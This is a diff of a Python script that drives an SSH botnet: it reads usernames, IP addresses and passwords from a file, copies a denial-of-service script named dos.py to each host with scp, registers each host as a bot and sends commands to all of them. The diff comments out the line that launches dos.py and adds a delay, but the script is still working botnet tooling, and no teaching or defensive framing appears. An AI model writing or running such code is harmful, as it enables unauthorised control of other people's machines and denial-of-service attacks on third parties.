@@ -4,6 +4,7 @@ import optparse
 #import pxssh
 from pexpect import pxssh
 import pexpect
+import time
 
 class Client:
 
@@ -39,7 +40,7 @@ def addClient(host, user, password):
     botNet.append(client)
 
 def sendDoSFile(host,user,password):
-    connStr = 'scp dos.py ' + user + '@' + host + ':~'
+    connStr = 'scp dos.py ' + user + '@' + host + ':~/'
     child = pexpect.spawn(connStr)
     child.expect(['password:'])
     child.sendline(password)
@@ -48,14 +49,15 @@ def sendDoSFile(host,user,password):
 def main():
     ipFile = open('sshpass.txt', 'r')
     for line in ipFile.readlines():
-        user = line.split(':')[0]
-        passwd = line.split(':')[1]
-        ip = line.split(':')[2].strip('\n').strip('\r')
-        sendDoSFile(ip, user, passwd)
+        user = line.split('@')[0]
+        ip = line.split('@')[1]
+        passwd = line.split('@')[2].strip('\n').strip('\r')
+        sendDoSFile(ip, user, passwd)#send empty file...
         addClient(ip, user, passwd)
+        time.sleep(10)
 
     botnetCommand('uname -v')
-    botnetCommand('python dos.py')
+    #botnetCommand('python dos.py')
 
 botNet = []
 
